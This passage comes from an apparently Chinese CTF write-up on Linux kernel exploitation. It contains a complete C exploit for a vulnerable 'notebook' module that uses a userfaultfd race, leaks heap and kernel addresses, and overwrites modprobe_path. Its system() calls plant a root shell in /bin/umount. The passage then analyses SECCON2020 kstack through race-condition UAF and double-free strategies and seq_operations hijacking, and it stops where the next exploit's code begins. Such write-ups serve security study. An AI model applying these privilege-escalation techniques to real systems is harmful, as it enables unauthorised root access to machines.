class="number">0xFFFFFFFF81000000</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> kernel_base;</span><br><span class="line"><span class="keyword">uint64_t</span> modprobe_addr = <span class="number">0xFFFFFFFF8225D2E1</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">note</span>&#123;</span></span><br><span class="line">	<span class="keyword">uint64_t</span> note;</span><br><span class="line">	<span class="keyword">uint64_t</span> size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">userarg</span>&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> idx;</span><br><span class="line">    <span class="keyword">uint64_t</span> size;</span><br><span class="line">    <span class="keyword">char</span>* buf;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ErrExit</span><span class="params">(<span class="keyword">char</span>* err_msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(err_msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">userfaultfd_leak_handler</span><span class="params">(<span class="keyword">void</span>* arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> uffd = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) arg;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">    <span class="keyword">int</span> nready;</span><br><span class="line">    </span><br><span class="line">    pollfd.fd = uffd;</span><br><span class="line">    pollfd.events = POLLIN;</span><br><span class="line">    nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">    sleep(<span class="number">30</span>);</span><br><span class="line">    <span class="comment">// pause();</span></span><br><span class="line">    <span class="keyword">if</span> (nready != <span class="number">1</span>) ErrExit(<span class="string">&quot;[-] Wrong poll return val&quot;</span>);</span><br><span class="line"></span><br><span class="line">    nready = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">    <span class="keyword">if</span> (nready &lt;= <span class="number">0</span>) ErrExit(<span class="string">&quot;[-] msg err&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span>* page = (<span class="keyword">char</span>*) mmap(<span class="literal">NULL</span>, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (page == MAP_FAILED) ErrExit(<span class="string">&quot;[-] mmap err&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(page, <span class="number">0</span>, <span class="keyword">sizeof</span>(page));</span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uc</span>;</span></span><br><span class="line">    uc.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) page;</span><br><span class="line">    uc.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) msg.arg.pagefault.address &amp; ~(PAGE_SIZE - <span class="number">1</span>);</span><br><span class="line">    uc.len = PAGE_SIZE;</span><br><span class="line">    uc.mode = <span class="number">0</span>;</span><br><span class="line">    uc.copy = <span class="number">0</span>;</span><br><span class="line">    ioctl(uffd, UFFDIO_COPY, &amp;uc);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] leak handler done&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RegisterUserfault</span><span class="params">(<span class="keyword">void</span> *fault_page,<span class="keyword">void</span> *handler)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pthread_t</span> thr;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">ua</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">ur</span>;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> uffd  = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    ua.api = UFFD_API;</span><br><span class="line">    ua.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;ua) == <span class="number">-1</span>)</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"></span><br><span class="line">    ur.range.start = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)fault_page;     <span class="comment">//我们要监视的区域</span></span><br><span class="line">    ur.range.len   = PAGE_SIZE;</span><br><span class="line">    ur.mode        = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;ur) == <span class="number">-1</span>)    <span class="comment">//注册缺页错误处理</span></span><br><span class="line">        ErrExit(<span class="string">&quot;[-] ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> s = pthread_create(&amp;thr, <span class="literal">NULL</span>,handler, (<span class="keyword">void</span>*)uffd);</span><br><span class="line">    <span class="keyword">if</span> (s!=<span class="number">0</span>)</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] pthread_create&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">noteadd</span><span class="params">(<span class="keyword">uint64_t</span> idx, <span class="keyword">uint64_t</span> size, <span class="keyword">char</span>* buf)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">userarg</span> <span class="title">arg</span> =</span> &#123;</span><br><span class="line">        .idx = idx,</span><br><span class="line">        .size = size,</span><br><span class="line">        .buf = buf,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    ioctl(g_fd, <span class="number">0x100</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">notedel</span><span class="params">(<span class="keyword">uint64_t</span> idx)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">userarg</span> <span class="title">arg</span> =</span> &#123;</span><br><span class="line">        .idx = idx,</span><br><span class="line">        .size = <span class="number">0</span>,</span><br><span class="line">        .buf = <span class="number">0</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">    ioctl(g_fd, <span class="number">0x200</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">noteedit</span><span class="params">(<span class="keyword">uint64_t</span> idx, <span class="keyword">uint64_t</span> size, <span class="keyword">char</span>* buf)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">userarg</span> <span class="title">arg</span> =</span> &#123;</span><br><span class="line">        .idx = idx,</span><br><span class="line">        .size = size,</span><br><span class="line">        .buf = buf,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    ioctl(g_fd, <span class="number">0x300</span>, &amp;arg);    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">notegift</span><span class="params">(<span class="keyword">char</span>* buf)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">userarg</span> <span class="title">arg</span> =</span> &#123;</span><br><span class="line">        .idx = <span class="number">0</span>,</span><br><span class="line">        .size = <span class="number">0</span>,</span><br><span class="line">        .buf = buf,</span><br><span class="line">    &#125;;   </span><br><span class="line"></span><br><span class="line">    ioctl(g_fd, <span class="number">0x64</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">write_note</span><span class="params">(<span class="keyword">char</span>* con_buf, <span class="keyword">uint64_t</span> idx)</span></span>&#123;</span><br><span class="line">    write(g_fd,con_buf,idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read_note</span><span class="params">(<span class="keyword">char</span>* con_buf, <span class="keyword">uint64_t</span> idx)</span></span>&#123;</span><br><span class="line">    read(g_fd,con_buf,idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">edit_thread</span><span class="params">()</span></span>&#123;</span><br><span class="line">    noteedit(<span class="number">0</span>, <span class="number">0x100</span>, addr);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">add_thread</span><span class="params">()</span></span>&#123;</span><br><span class="line">    noteadd(<span class="number">0</span>,<span class="number">0x60</span>,addr);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_mod_base</span><span class="params">()</span></span>&#123;</span><br><span class="line">    FILE *stream =popen(<span class="string">&quot;cat /tmp/moduleaddr  | awk &#x27;&#123;print $6&#125;&#x27;&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">char</span> *mem = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    fread(mem,<span class="number">0x12</span>,<span class="number">1</span>,stream);</span><br><span class="line">    module_base = strtoul(mem,<span class="literal">NULL</span>,<span class="number">16</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Mod_BASE:\t %lX\n&quot;</span>,module_base);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *ret_buf = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">char</span> *in_buf = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">char</span> *name = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">memset</span>(name,<span class="string">&#x27;a&#x27;</span>,<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">    get_mod_base();</span><br><span class="line"></span><br><span class="line">    g_fd = open(<span class="string">&quot;/dev/notebook&quot;</span>,<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    noteadd(<span class="number">0</span>,<span class="number">0x60</span>,name);</span><br><span class="line">    noteadd(<span class="number">1</span>,<span class="number">0x60</span>,name);</span><br><span class="line"></span><br><span class="line">    notegift(ret_buf);</span><br><span class="line">    <span class="keyword">uint64_t</span> heap0 = *(<span class="keyword">uint64_t</span> *)ret_buf;</span><br><span class="line">    <span class="keyword">uint64_t</span> heap1 = *(<span class="keyword">uint64_t</span> *)(ret_buf+<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    notedel(<span class="number">0</span>);</span><br><span class="line">    notedel(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> found = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> heap0_index,heap1_index;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">0x10</span>; i++)&#123;</span><br><span class="line">        noteadd(i,<span class="number">0x60</span>,name);</span><br><span class="line">        notegift(ret_buf);</span><br><span class="line">        <span class="keyword">if</span>(*(<span class="keyword">uint64_t</span> *)(ret_buf+i*<span class="number">0x10</span>) == heap1)&#123;</span><br><span class="line">            heap1_index = i;</span><br><span class="line">            found +=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(*(<span class="keyword">uint64_t</span> *)(ret_buf+i*<span class="number">0x10</span>) == heap0)&#123;</span><br><span class="line">            heap0_index = i;</span><br><span class="line">            found +=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(found == <span class="number">2</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] we find it! \n heap0 in index %ld \n heap1 in index %ld \n&quot;</span>,heap0_index,heap1_index);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[-] now, i : %d\n&quot;</span>,i);</span><br><span class="line">    read_note(ret_buf,heap1_index);</span><br><span class="line">    <span class="keyword">uint64_t</span> magic = *(<span class="keyword">uint64_t</span> *)ret_buf;</span><br><span class="line">    <span class="keyword">uint64_t</span> cookie = magic^heap0^heap1;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;cookie is 0x%lx\n&quot;</span>,cookie);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 重新开始</span></span><br><span class="line">    noteadd(<span class="number">0</span>,<span class="number">0x60</span>,name);</span><br><span class="line">    addr = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    RegisterUserfault(addr, userfaultfd_leak_handler);</span><br><span class="line">    <span class="keyword">pthread_t</span> thr_edit,thr_add;</span><br><span class="line">    pthread_create(&amp;thr_edit, <span class="literal">NULL</span>, edit_thread, <span class="number">0</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    pthread_create(&amp;thr_add, <span class="literal">NULL</span>, add_thread, <span class="number">0</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    notegift(ret_buf);</span><br><span class="line">    <span class="keyword">uint64_t</span> uaf_heap_addr = *(<span class="keyword">uint64_t</span> *)(ret_buf);</span><br><span class="line">    <span class="keyword">uint64_t</span> notebook_sub_0x10 = module_base + + <span class="number">0x2500</span> - <span class="number">0x10</span>;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)in_buf = cookie^uaf_heap_addr^notebook_sub_0x10;</span><br><span class="line">    write_note(in_buf,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(name+<span class="number">0xF0</span>) = cookie^notebook_sub_0x10^<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> fake_index = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>( j=<span class="number">1</span>; j &lt; <span class="number">0x10</span> ; j++)&#123;</span><br><span class="line">        noteadd(j,<span class="number">0x60</span>,name);</span><br><span class="line">        notegift(ret_buf);</span><br><span class="line">        <span class="keyword">if</span>(*(<span class="keyword">uint64_t</span> *)(ret_buf+j*<span class="number">0x10</span>) == uaf_heap_addr)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] got it!\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(j == <span class="number">0x10</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] reboot, and try again\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// printf(&quot;give you 20s to attach debugger!!!\n&quot;);</span></span><br><span class="line">    <span class="comment">// sleep(20);</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;kmalloc uaf object back\n&quot;</span>);</span><br><span class="line">    fake_index = j+<span class="number">1</span>;</span><br><span class="line">    noteadd(fake_index,<span class="number">0x60</span>,name);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// leak kernel base</span></span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(in_buf+<span class="number">0x20</span>) = module_base + <span class="number">0x168</span>;          <span class="comment">// call copy_from_user</span></span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(in_buf+<span class="number">0x28</span>) = <span class="number">0x4</span>;   </span><br><span class="line">    write_note(in_buf,fake_index);</span><br><span class="line">    read_note(ret_buf,<span class="number">1</span>);</span><br><span class="line">    kernel_base = ((*(<span class="keyword">uint32_t</span> *)ret_buf + module_base + <span class="number">0x16c</span>) | <span class="number">0xffffffff00000000</span>) - <span class="number">0x476c30</span>;</span><br><span class="line">    <span class="comment">// 被调用函数实际段偏移量 = 下一条指令地址 + 相对偏移量</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;kernel base : 0x%lx\n&quot;</span>,kernel_base);</span><br><span class="line"></span><br><span class="line"><span class="comment">// change modprobe_path </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] change notebook[0] to point to modprobe_path!\n&quot;</span>);</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(in_buf+<span class="number">0x10</span>) = modprobe_addr - bzImage_base + kernel_base;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(in_buf+<span class="number">0x18</span>) = <span class="number">0x8</span>;</span><br><span class="line">    write_note(in_buf,fake_index);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] write notebook[0] to change modprobe_path!\n&quot;</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(in_buf,<span class="string">&quot;/tmp/x\x00&quot;</span>,<span class="number">8</span>);</span><br><span class="line">    write_note(in_buf,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;echo &#x27;#!/bin/sh\nrm /bin/umount\necho -e \&quot;#!/bin/sh\\nexec 0&lt;/dev/console\\nexec 1&gt;/dev/console\\nexec 2&gt;/dev/console\\n/bin/sh\\n\&quot; &gt; /bin/umount\nchmod 777 /bin/umount&#x27; &gt; /tmp/x&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;echo &#x27;chmod 777 /flag&#x27; &gt;&gt; /tmp/x&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /tmp/x&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;echo -ne &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /tmp/dummy&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /tmp/dummy&quot;</span>);</span><br><span class="line">                         </span><br><span class="line">    system(<span class="string">&quot;/tmp/dummy 2&gt;/dev/null&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;ls -l /flag&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>



        <h2 id="问题"   >
          <a href="#问题" class="heading-link"><i class="fas fa-link"></i></a><a href="#问题" class="headerlink" title="问题"></a>问题</h2>
      <ul>
<li><p>问题1：/init的输出无法显示是什么原因？</p>
<p>为什么这个题，使用modprobe_path方法改了umount，但exit后不能获得root shell？？？因为init脚本中，没有下面这三行：</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span> 0&lt;/dev/console</span><br><span class="line"><span class="built_in">exec</span> 1&gt;/dev/console</span><br><span class="line"><span class="built_in">exec</span> 2&gt;/dev/console</span><br></pre></td></tr></table></div></figure>
<p>导致exit退出后，<code>/dev/console</code>的内容无法显示给我们。如下图，是在init脚本中增加以上三行代码的结果。</p>
<p><img   src="image-20230225194548400.png?size=600" style="width: 600px;"  alt="image-20230225194548400"></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.baeldung.com/linux/monitor-keyboard-drivers" >Difference between /dev/console, /dev/tty, and /dev/tty0</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>找到根本原因后，一切就变得简单了。在我们改的umount文件中，<code>/bin/sh</code>之前增加这三行代码，就能达到获得root shell的目的啦！</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(<span class="string">&quot;echo &#x27;#!/bin/sh\nrm /bin/umount\necho -e \&quot;#!/bin/sh\\nexec 0&lt;/dev/console\\nexec 1&gt;/dev/console\\nexec 2&gt;/dev/console\\n/bin/sh\\n\&quot; &gt; /bin/umount\nchmod 777 /bin/umount&#x27; &gt; /tmp/x&quot;</span>);</span><br></pre></td></tr></table></div></figure>

</li>
<li><p>问题2：在内核态执行<code>commit_creds(prepare_kernel_cred(0))</code>时，gadget不好找，怎么办？</p>
<p>对于支持多核的内核中，有一个 <span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.15/source/kernel/workqueue.c#L5170" >work_for_cpu_fn()</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 函数，其反汇编后的代码如下</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">work_for_cpu_fn</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  _fentry__();</span><br><span class="line">  result = (*(__int64 (__fastcall **)(_QWORD))(a1 + <span class="number">32</span>))(*(_QWORD *)(a1 + <span class="number">40</span>));</span><br><span class="line">  *(_QWORD *)(a1 + <span class="number">48</span>) = result;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
<p>只要控制参数a1（RDI）指向内存的内容，即可执行一个参数的任意函数（如<code>prepare_kernel_cred(0)</code>），并将返回值写入内存中。</p>
</li>
</ul>

        <h1 id="题目2-SECCON2020-kstack"   >
          <a href="#题目2-SECCON2020-kstack" class="heading-link"><i class="fas fa-link"></i></a><a href="#题目2-SECCON2020-kstack" class="headerlink" title="题目2 - SECCON2020 kstack"></a>题目2 - SECCON2020 kstack</h1>
      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=6dFmH_JEF4s" >userfaultfd利用方法视频讲解</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/BrieflyX/ctf-pwns/tree/master/kernel/kstack" >Kstack - Seccon 2020</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/266898" >从 SECCON2020 一道 kernel pwn 看 userfaultfd + setxattr “堆占位”技术</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://roderickchan.github.io/2022/04/28/seccon-2020-kstack/" >seccon-2020-kstack</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>系统开启KASLR，SMEP，KPTI</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">➜  kstack cat start.sh </span><br><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 512M \</span><br><span class="line">    -kernel ./bzImage \</span><br><span class="line">    -initrd ./rootfs.cpio \</span><br><span class="line">    -append <span class="string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 kaslr quiet&quot;</span> \</span><br><span class="line">    -cpu kvm64,+smep \</span><br><span class="line">    -net user -net nic -device e1000 \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -nographic</span><br><span class="line"></span><br><span class="line">$ cat /sys/devices/system/cpu/vulnerabilities/*</span><br><span class="line">Processor vulnerable</span><br><span class="line">Mitigation: PTE Inversion</span><br><span class="line">Vulnerable: Clear CPU buffers attempted, no microcode; SMT Host state unknown</span><br><span class="line">Mitigation: PTI</span><br><span class="line">Vulnerable</span><br><span class="line">Mitigation: usercopy/swapgs barriers and __user pointer sanitization</span><br><span class="line">Mitigation: Full generic retpoline, STIBP: disabled, RSB filling</span><br><span class="line">Not affected</span><br></pre></td></tr></table></div></figure>



        <h2 id="分析-1"   >
          <a href="#分析-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2>
      <p>题目附件：<a href="kstack.80da39cf379e98884be9c02889575868.tar.gz">kstack.tar.gz</a></p>
<p>全局变量head未加锁，在0x57ac001和0x57ac002两个分支中都有使用到它，所以存在条件竞争的可能。</p>
<p><img   src="image-20230301002128590.png?size=600" style="width: 600px;"  alt="image-20230301002128590"></p>

        <h2 id="利用-1"   >
          <a href="#利用-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#利用-1" class="headerlink" title="利用"></a>利用</h2>
      <p>方法1 - <strong>exp1</strong>：</p>
<ul>
<li><strong>条件竞争泄露信息</strong>：如果利用userfaultfd让一个线程卡在copy_from_user，另一个线程执行copy_to_user分支，就能泄露堆上的信息</li>
<li><strong>条件竞争产生UAF</strong>：copy_to_user线程执行完后，会free掉第一个线程申请的堆，于是产生了悬空指针。</li>
<li><strong>结构体占用UAF堆块，完成控制流劫持</strong>：如果使用某个结构体占用刚刚释放的堆块，并在此时恢复copy_from_user线程的执行，让*arg覆盖结构体中的函数指针，就可以劫持控制流了。</li>
</ul>
<p>方法2- <strong>exp2</strong>：</p>
<ul>
<li><p><strong>条件竞争泄露信息</strong>：同上</p>
</li>
<li><p><strong>条件竞争构造double free</strong>：copy_from_user线程卡住，起第二个线程执行到copy_to_user处卡住，此时第三个线程也进入copy_to_user释放堆块，然后放行第二个线程，会再次释放堆块，于是产生double free</p>
</li>
<li><p><strong>“setxattrr+usefaultfd” 改堆块指针，达到任意地址写</strong>：同libc</p>
</li>
</ul>
<p>方法3 - <strong>exp3</strong>：</p>
<ul>
<li><strong>条件竞争泄露信息</strong>：同上</li>
<li><strong>条件竞争构造double free</strong>：同上</li>
<li><strong>结构体占用double free堆块，”setxattrr+usefaultfd” 改结构体函数指针，完成控制流劫持</strong>：某种程度上，可以看作方法1和方法2的结合。double free后，先malloc并用seq_operations占用UAF堆块，再malloc一次（还是那个UAF堆块）并使用”setxaddr+userfaultfd”改函数指针，最后通过操作seq_operations-&gt;start控制流劫持</li>
</ul>

        <h3 id="exp1-1"   >
          <a href="#exp1-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#exp1-1" class="headerlink" title="exp1"></a>exp1</h3>
      <p>具体做法如下：</p>
<ul>
<li>信息泄露：<code>CMD_PUSH</code>分支中，申请的堆块为kmalloc-0x20大小。于是选择先通过<code> open(&quot;/proc/self/stat&quot;,0);</code>（申请0x20堆块）和<code>close()</code>（释放0x20堆块）在堆中喷上函数指针，再利用本题的漏洞，就能从copy_to_user()泄露内核函数地址（<code>single_stop()</code>）给用户态。</li>
<li>控制流劫持：利用seq_operations结构体占用该堆块，并控制copy_from_user的arg地址处的值，那么就能控制<code>seq_operations-&gt;stop</code>函数指针。</li>
<li>提权：利用pt_regs执行ROP gadget写modprobe_path，完成提权。</li>
</ul>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span 